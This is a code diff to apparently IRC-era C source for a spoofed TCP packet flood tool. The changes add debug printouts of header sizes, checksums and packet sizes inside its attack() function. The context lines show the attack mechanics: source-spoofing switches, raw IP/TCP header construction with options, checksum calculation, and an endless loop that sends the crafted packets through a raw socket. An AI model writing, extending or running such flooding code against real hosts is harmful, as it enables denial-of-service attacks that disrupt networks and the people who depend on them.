@@ -71,6 +71,7 @@ By darkness@efnet. // greetz vae@efnet.
 #define IP_DF                         0x4000        /* dont fragment flag */
 #define IP_MF                         0x2000        /* more fragments flag */
 #define IP_OFFMASK                    0x1fff        /* mask for fragmenting bits */
+//#define DEBUG_TCP                                   /* Debugging purposes */
 
 // Spoofing Type Triggers
 bool destFullSpoof = false;
@@ -353,6 +354,18 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
     memcpy(ps_tcphdr, xf_tcphdr, sizeof(struct tcphdr2));
     memcpy(ps_tcpopt, xf_tcpopt, sizeof(struct tcp_opthdr));
 
+#ifdef DEBUG_TCP
+    printf("> Pseudo HDR: %u\n", sizeof(struct ph));
+    printf("> IP HDR: %u\n", sizeof(struct ip));
+    printf("> TCP HDR: %u\n", sizeof(struct tcphdr2));
+    printf("> TCP OPTHDR: %u\n", sizeof(struct tcp_opthdr));
+    printf("> Databytes: %u\n", databytes);
+    printf("> th_sum: %u\n", xf_tcphdr->th_sum);
+    printf("> TCP Packet Size: %zu\n", sizeof(struct ph) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
+#else
+    printf("TCP Packet Size: %zu\n", sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
+#endif
+
     while (true)
     {
         // Core functionality
@@ -504,6 +517,16 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
 
         // Calculate TCP checksum
         xf_tcphdr->th_sum = csum((unsigned short*)tcpbuf.buf, sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
+
+#ifdef DEBUG_TCP
+        printf("> Loop Pseudo HDR: %u\n", sizeof(struct ph));
+        printf("> Loop IP HDR: %u\n", sizeof(struct ip));
+        printf("> Loop TCP HDR: %u\n", sizeof(struct tcphdr2));
+        printf("> Loop TCP OPTHDR: %u\n", sizeof(struct tcp_opthdr));
+        printf("> Loop Databytes: %u\n", databytes);
+        printf("> Loopth_sum: %u\n", xf_tcphdr->th_sum);
+        printf("> TCP Packet Size: %zu\n", sizeof(struct ph) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
+#endif
 
         // Send our newly modified loop packet.
         sendto(rawsock, tcpbuf.buf, sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes, 0, (struct sockaddr*)&sin, sizeof(sin)), packets++;
